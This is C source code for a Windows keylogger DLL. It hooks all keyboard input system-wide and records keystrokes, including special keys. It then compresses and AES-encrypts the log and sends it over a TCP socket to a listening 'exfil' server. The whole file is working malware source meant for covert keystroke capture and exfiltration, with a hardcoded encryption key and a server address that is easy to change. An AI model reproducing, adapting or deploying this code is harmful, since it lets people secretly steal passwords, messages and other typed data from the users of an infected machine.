/***************************************************************************************************
* Windows keylogger that logs most keypresses using a global low-level keyboard hook
* Also LZNT1 compresses and AES256 encrypts hook data for exfil to listening server
* Notable missing keys: Shift (state handled, key press just not logged), Ctrl, and Alt
* Must be compiled as a DLL with Keylogger.h to work because global hooks require DLLs
* Use a complementary executable (such as KeyloggerWithExfil.c) to handle loading and unloading the hook
*    into memory to begin logging
* ****************************************************************************************************/


#include "Keylogger.h"
#include <Windows.h>
#include <strsafe.h>
#include <wincrypt.h>

#pragma comment(lib,"Ws2_32.lib")
#pragma comment(lib,"Crypt32.lib")

typedef  NTSTATUS (__stdcall *LPRTLCOMPRESSBUFFER) (USHORT, PUCHAR, ULONG, PUCHAR, ULONG, ULONG, PULONG, PVOID);
typedef  NTSTATUS (__stdcall *LPTRLGETCOMPRESSIONWORKSPACESIZE) (USHORT, PULONG, PULONG);

// Handles / function pointers

HANDLE hThisDll = NULL;
HHOOK hHook = NULL;
HANDLE hLogfile = INVALID_HANDLE_VALUE;
LPRTLCOMPRESSBUFFER lpRtlCompressBuffer = NULL;
LPTRLGETCOMPRESSIONWORKSPACESIZE lpRtlCompressionWorkSpaceSize = NULL;

// Buffer and key state variables

WCHAR* pwcLogBuffer = NULL;
// Starting buffer size of 1MB
// Increased dynamically during logging as required
DWORD dwBufferSize = 1024*1024;
DWORD dwCurrBuffLen = 0;
// Hook can produce messages with multiple characters from ToUnicodeEx with no definite limit
// 256 is an arbitrary buffer size that should be large enough to hold any result
WCHAR wcOutput[256];
// Max output needs to match arbitrary wcOutput buffer size
INT nMaxOutput = 256;
BYTE bKeyState[256];

// Encryption variables

WCHAR* pwcEncryptionKey = L"ThisIsMyEncryptionKey";
HCRYPTPROV hCryptProv = 0;
HCRYPTHASH hCryptHash = 0;
HCRYPTKEY hCryptKey = 0;
DWORD dwEncryptKeyLen = 0;
// 16-bytes IV length * 2 for CryptGenRandom standards
BYTE bIVBuffer[32];

// Connection to exfil server

SOCKET pSock = INVALID_SOCKET;
SOCKADDR_IN SockAddr;

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        hThisDll = hinstDLL;
        break;

    case DLL_THREAD_ATTACH:
        break;

    case DLL_THREAD_DETACH:
        break;

    case DLL_PROCESS_DETACH:
        Cleanup();
        break;
    }

    return TRUE;
}

DWORD StartLogging() {
    DWORD dwErrorCode = 0;
    HMODULE hNtdll = GetModuleHandle(TEXT("ntdll.dll"));
    if (NULL == hNtdll) {
        return GetLastError();
    }
    lpRtlCompressBuffer = (LPRTLCOMPRESSBUFFER)GetProcAddress(hNtdll, "RtlCompressBuffer");
    if (NULL == lpRtlCompressBuffer) {
        return GetLastError();
    }
    lpRtlCompressionWorkSpaceSize = (LPTRLGETCOMPRESSIONWORKSPACESIZE)GetProcAddress(hNtdll, "RtlGetCompressionWorkSpaceSize");
    if (NULL == lpRtlCompressionWorkSpaceSize) {
        return GetLastError();
    }
    dwErrorCode = InitCrypto();
    if (0 != dwErrorCode) {
        return dwErrorCode;
    }
    dwErrorCode = (DWORD)InitExfilConn();
    if (0 != dwErrorCode) {
        return dwErrorCode;
    }
    dwErrorCode = SetHook();
    if (0 != dwErrorCode) {
        return dwErrorCode;
    }
    __try {
        pwcLogBuffer = HeapAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS | HEAP_ZERO_MEMORY, dwBufferSize);
    }
    __except (STATUS_NO_MEMORY == GetExceptionCode() || STATUS_ACCESS_VIOLATION == GetExceptionCode()) {
        return GetExceptionCode();
    }
    SecureZeroMemory(&bKeyState, 256);
    SecureZeroMemory(&wcOutput, 256);

    //Message loop
    MSG Msg;
    SecureZeroMemory(&Msg, sizeof(MSG));
    while (GetMessage(&Msg, NULL, 0, 0) > 0) {
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }

    RemoveHook();
    return SendLog();
}

DWORD InitCrypto() {
    StringCbLength(pwcEncryptionKey, STRSAFE_MAX_LENGTH, (SIZE_T*)&dwEncryptKeyLen);
    SecureZeroMemory(&bIVBuffer, 32);
    DWORD dwErrorCode = 0;

    if (!CryptAcquireContextW(
        &hCryptProv,
        NULL,
        MS_ENH_RSA_AES_PROV,
        PROV_RSA_AES,
        CRYPT_VERIFYCONTEXT))
    {
        dwErrorCode = GetLastError();
        return dwErrorCode;
    }

    if (!CryptCreateHash(
        hCryptProv,
        CALG_SHA,
        0,
        0,
        &hCryptHash
    ))
    {
        dwErrorCode = GetLastError();
        CleanCrypto();
        return dwErrorCode;
    }

    if (!CryptHashData(
        hCryptHash,
        (BYTE*) pwcEncryptionKey,
        dwEncryptKeyLen,
        0
    ))
    {
        dwErrorCode = GetLastError();
        CleanCrypto();
        return dwErrorCode;
    }

    if (!CryptDeriveKey(
        hCryptProv,
        CALG_AES_256,
        hCryptHash,
        // 256-bit key length
        0x01000000 | CRYPT_EXPORTABLE,
        &hCryptKey
    ))
    {
        dwErrorCode = GetLastError();
        CleanCrypto();
        return dwErrorCode;
    }

    if (!CryptGenRandom(
        hCryptProv,
        16,
        (BYTE*) bIVBuffer
    ))
    {
        dwErrorCode = GetLastError();
        CleanCrypto();
        return dwErrorCode;
    }

    if (!CryptSetKeyParam(
        hCryptKey,
        KP_IV,
        (BYTE*) bIVBuffer,
        0
    ))
    {
        dwErrorCode = GetLastError();
        CleanCrypto();
        return dwErrorCode;
    }
    
    return 0;
}

INT InitExfilConn() {
    WSADATA WsaData;
    INT iErrorCode = 0;
    SecureZeroMemory(&WsaData, sizeof(WSADATA));
    SecureZeroMemory(&SockAddr, sizeof(SOCKADDR_IN));
    if (0 != WSAStartup(MAKEWORD(2, 2), &WsaData))
    {
        return WSAGetLastError();
    }

    pSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (INVALID_SOCKET == pSock)
    {
        iErrorCode = WSAGetLastError();
        WSACleanup();
        return iErrorCode;
    }

    SockAddr.sin_family = AF_INET;
    SockAddr.sin_port = htons(12345);
    SockAddr.sin_addr.s_addr = inet_addr("127.0.0.1");

    if (0 != connect(pSock, (SOCKADDR*)&SockAddr, sizeof(SockAddr)))
    {
        iErrorCode = WSAGetLastError();
        WSACleanup();
        return iErrorCode;
    }

    // Send IV now so server is ready when exfil is sent later
    send(pSock, (CHAR*)bIVBuffer, 16, 0);
    return 0;
}

DWORD SetHook()
{
    if (NULL == hHook) {
        hHook = SetWindowsHookExW(WH_KEYBOARD_LL, (HOOKPROC)LowLevelKeyboardHook, hThisDll, 0);
        if (NULL == hHook) {
            return GetLastError();
        }
    }
    return 0;
}

LRESULT CALLBACK LowLevelKeyboardHook(INT nCode, WPARAM wParam, LPARAM lParam) {
    if (0 > nCode) {
        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }

    if (HC_ACTION == nCode) {
        KBDLLHOOKSTRUCT* lpHookStruct = (KBDLLHOOKSTRUCT*)lParam;
        HKL hLayout = GetKeyboardLayout(0);
        DWORD dwOutputLen = 0;
        switch (wParam) {
        case WM_KEYDOWN:
            switch (lpHookStruct->vkCode) {
            case VK_BACK:
                StringCchCopy(wcOutput, nMaxOutput, L"[backspace]");
                StringCbLength(wcOutput, nMaxOutput, (SIZE_T*)&dwOutputLen);
                break;
            case VK_TAB:
                StringCchCopy(wcOutput, nMaxOutput, L"[tab]");
                StringCbLength(wcOutput, nMaxOutput, (SIZE_T*)&dwOutputLen);
                break;
            case VK_RETURN:
                // This return code will be the primary separator for the logfile to
                //   help break it into more readable chunks, hence the extra newline
                StringCchCopy(wcOutput, nMaxOutput, L"[return]\n");
                StringCbLength(wcOutput, nMaxOutput, (SIZE_T*)&dwOutputLen);
                break;
            case VK_CAPITAL:
                StringCchCopy(wcOutput, nMaxOutput, L"[caps lock]");
                StringCbLength(wcOutput, nMaxOutput, (SIZE_T*)&dwOutputLen);
                break;
            case VK_ESCAPE:
                StringCchCopy(wcOutput, nMaxOutput, L"[esc]");
                StringCbLength(wcOutput, nMaxOutput, (SIZE_T*)&dwOutputLen);
                break;
            case VK_SPACE:
                StringCchCopy(wcOutput, nMaxOutput, L" ");
                StringCbLength(wcOutput, nMaxOutput, (SIZE_T*)&dwOutputLen);
                break;
            case VK_END:
                StringCchCopy(wcOutput, nMaxOutput, L"[end]");
                StringCbLength(wcOutput, nMaxOutput, (SIZE_T*)&dwOutputLen);
                break;
            case VK_HOME:
                StringCchCopy(wcOutput, nMaxOutput, L"[home]");
                StringCbLength(wcOutput, nMaxOutput, (SIZE_T*)&dwOutputLen);
                break;
            case VK_LEFT:
                StringCchCopy(wcOutput, nMaxOutput, L"[left arrow]");
                StringCbLength(wcOutput, nMaxOutput, (SIZE_T*)&dwOutputLen);
                break;
            case VK_UP:
                StringCchCopy(wcOutput, nMaxOutput, L"[up arrow]");
                StringCbLength(wcOutput, nMaxOutput, (SIZE_T*)&dwOutputLen);
                break;
            case VK_RIGHT:
                StringCchCopy(wcOutput, nMaxOutput, L"[right arrow]");
                StringCbLength(wcOutput, nMaxOutput, (SIZE_T*)&dwOutputLen);
                break;
            case VK_DOWN:
                StringCchCopy(wcOutput, nMaxOutput, L"[down arrow]");
                StringCbLength(wcOutput, nMaxOutput, (SIZE_T*)&dwOutputLen);
                break;
            case VK_DELETE:
                StringCchCopy(wcOutput, nMaxOutput, L"[del]");
                StringCbLength(wcOutput, nMaxOutput, (SIZE_T*)&dwOutputLen);
                break;
            case VK_F1:
                StringCchCopy(wcOutput, nMaxOutput, L"[F1]");
                StringCbLength(wcOutput, nMaxOutput, (SIZE_T*)&dwOutputLen);
                break;
            case VK_F2:
                StringCchCopy(wcOutput, nMaxOutput, L"[F2]");
                StringCbLength(wcOutput, nMaxOutput, (SIZE_T*)&dwOutputLen);
                break;
            case VK_F3:
                StringCchCopy(wcOutput, nMaxOutput, L"[F3]");
                StringCbLength(wcOutput, nMaxOutput, (SIZE_T*)&dwOutputLen);
                break;
            case VK_F4:
                StringCchCopy(wcOutput, nMaxOutput, L"[F4]");
                StringCbLength(wcOutput, nMaxOutput, (SIZE_T*)&dwOutputLen);
                break;
            case VK_F5:
                StringCchCopy(wcOutput, nMaxOutput, L"[F5]");
                StringCbLength(wcOutput, nMaxOutput, (SIZE_T*)&dwOutputLen);
                break;
            case VK_F6:
                StringCchCopy(wcOutput, nMaxOutput, L"[F6]");
                StringCbLength(wcOutput, nMaxOutput, (SIZE_T*)&dwOutputLen);
                break;
            case VK_F7:
                StringCchCopy(wcOutput, nMaxOutput, L"[F7]");
                StringCbLength(wcOutput, nMaxOutput, (SIZE_T*)&dwOutputLen);
                break;
            case VK_F8:
                StringCchCopy(wcOutput, nMaxOutput, L"[F8]");
                StringCbLength(wcOutput, nMaxOutput, (SIZE_T*)&dwOutputLen);
                break;
            case VK_F9:
                StringCchCopy(wcOutput, nMaxOutput, L"[F9]");
                StringCbLength(wcOutput, nMaxOutput, (SIZE_T*)&dwOutputLen);
                break;
            case VK_F10:
                StringCchCopy(wcOutput, nMaxOutput, L"[F10]");
                StringCbLength(wcOutput, nMaxOutput, (SIZE_T*)&dwOutputLen);
                break;
            case VK_F11:
                StringCchCopy(wcOutput, nMaxOutput, L"[F11]");
                StringCbLength(wcOutput, nMaxOutput, (SIZE_T*)&dwOutputLen);
                break;
            case VK_F12:
                StringCchCopy(wcOutput, nMaxOutput, L"[F12]");
                StringCbLength(wcOutput, nMaxOutput, (SIZE_T*)&dwOutputLen);
                break;
            default:
                bKeyState[VK_SHIFT] = GetKeyState(VK_SHIFT) >> 8;
                bKeyState[VK_CAPITAL] = GetKeyState(VK_CAPITAL) >> 8;
                bKeyState[VK_RMENU] = GetKeyState(VK_RMENU) >> 8;
                dwOutputLen = ToUnicodeEx(lpHookStruct->vkCode,
                    lpHookStruct->scanCode,
                    bKeyState,
                    wcOutput,
                    256,
                    0,
                    hLayout);
                // ToUnicodeEx returns a number of characters, need bytes
                // x2 for 2 bytes per WCHAR
                if (0 <= dwOutputLen) {
                    dwOutputLen *= 2;
                }
                break;
            }
            if (1 <= dwOutputLen) {
                if (dwOutputLen + dwCurrBuffLen >= dwBufferSize) {
                    __try {
                        // Find minimum doubled size needed to hold additional data
                        DWORD dwNewBuffSize = dwBufferSize * 2;
                        while (dwOutputLen + dwCurrBuffLen >= dwNewBuffSize) {
                            dwNewBuffSize *= 2;
                        }
                        WCHAR* pwcNewBuffer = NULL;
                        pwcNewBuffer = HeapReAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS | HEAP_ZERO_MEMORY, pwcLogBuffer, dwNewBuffSize);
                        pwcLogBuffer = pwcNewBuffer;
                        pwcNewBuffer = NULL;
                        dwBufferSize = dwNewBuffSize;
                    }
                    __except (STATUS_NO_MEMORY == GetExceptionCode() || STATUS_ACCESS_VIOLATION == GetExceptionCode()) {
                        // Reallocate failed, send current data and reset buffer instead
                        SendLog();
                        SecureZeroMemory(pwcLogBuffer, dwBufferSize);
                        dwCurrBuffLen = 0;
                    }
                }
                StringCbCat(pwcLogBuffer, dwBufferSize, wcOutput);
                dwCurrBuffLen += dwOutputLen;
            }
        }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

VOID RemoveHook() {
    if (NULL != hHook) {
        UnhookWindowsHookEx(hHook);
        hHook = NULL;
    }
}

DWORD SendLog() {
    WCHAR* pwcCompressedBuffer = NULL;
    DWORD dwCompressedBuffSize = dwBufferSize;
    DWORD dwCompressedLen = 0;
    VOID* pvWorkspaceBuffer = NULL;
    DWORD dwWorkSpaceSize = 0;
    DWORD dwWorkSpaceFragmentSize = 0;
    DWORD dwEncryptedSize = 0;
    DWORD dwErrorVal = 0;
    NTSTATUS Ntstatus = 0;

    __try {
        pwcCompressedBuffer = HeapAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS | HEAP_ZERO_MEMORY, dwCompressedBuffSize);
    }
    __except (STATUS_NO_MEMORY == GetExceptionCode() || STATUS_ACCESS_VIOLATION == GetExceptionCode()) {
        return GetExceptionCode();
    }

    Ntstatus = lpRtlCompressionWorkSpaceSize(
        COMPRESSION_FORMAT_LZNT1,
        &dwWorkSpaceSize,
        &dwWorkSpaceFragmentSize
    );
    if (0 != Ntstatus) {
        return Ntstatus;
    }

    __try {
        pvWorkspaceBuffer = HeapAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS | HEAP_ZERO_MEMORY, dwWorkSpaceSize);
    }
    __except (STATUS_NO_MEMORY == GetExceptionCode() || STATUS_ACCESS_VIOLATION == GetExceptionCode()) {
        HeapFree(GetProcessHeap(), 0, pwcCompressedBuffer);
        return GetExceptionCode();
    }

    lpRtlCompressBuffer(
        COMPRESSION_FORMAT_LZNT1,
        (UCHAR*)pwcLogBuffer,
        dwCurrBuffLen,
        (UCHAR*)pwcCompressedBuffer,
        dwCompressedBuffSize,
        4096L,
        &dwCompressedLen,
        pvWorkspaceBuffer
    );
    if (0 != Ntstatus) {
        HeapFree(GetProcessHeap(), 0, pwcCompressedBuffer);
        return Ntstatus;
    }

    if (!CryptEncrypt(
        hCryptKey,
        0,
        TRUE,
        0,
        (BYTE*)pwcCompressedBuffer,
        &dwCompressedLen,
        dwCompressedBuffSize
    )) {
        dwErrorVal = GetLastError();
        HeapFree(GetProcessHeap(), 0, pwcCompressedBuffer);
        HeapFree(GetProcessHeap(), 0, pvWorkspaceBuffer);
        return dwErrorVal;
    }

    // Exfil length to prep server
    send(pSock, (CHAR*)&dwCompressedLen, sizeof(DWORD), 0);
    // Actual exfil
    send(pSock, (CHAR*)pwcCompressedBuffer, dwCompressedLen, 0);

    HeapFree(GetProcessHeap(), 0, pwcCompressedBuffer);
    HeapFree(GetProcessHeap(), 0, pvWorkspaceBuffer);
    return 0;
}

VOID Cleanup() {
    if (NULL != hHook) {
        UnhookWindowsHookEx(hHook);
        hHook = NULL;
    }
    if (!CloseHandle(hLogfile)) {
        hLogfile = INVALID_HANDLE_VALUE;
    }
    HeapFree(GetProcessHeap(), 0, pwcLogBuffer);
    CleanCrypto();
    CleanExfilConn();
}

VOID CleanCrypto() {
    if (0 != hCryptKey) {
        if (!CryptDestroyKey(hCryptKey))
        {
            hCryptKey = 0;
        }
    }
    if (0 != hCryptHash) {
        if (!CryptDestroyHash(hCryptHash))
        {
            hCryptHash = 0;
        }
    }
    if (0 != hCryptProv) {
        if (!CryptReleaseContext(hCryptProv, 0))
        {
            hCryptProv = 0;
        }
    }
}

VOID CleanExfilConn() {
    shutdown(pSock, 2);
    WSACleanup();
}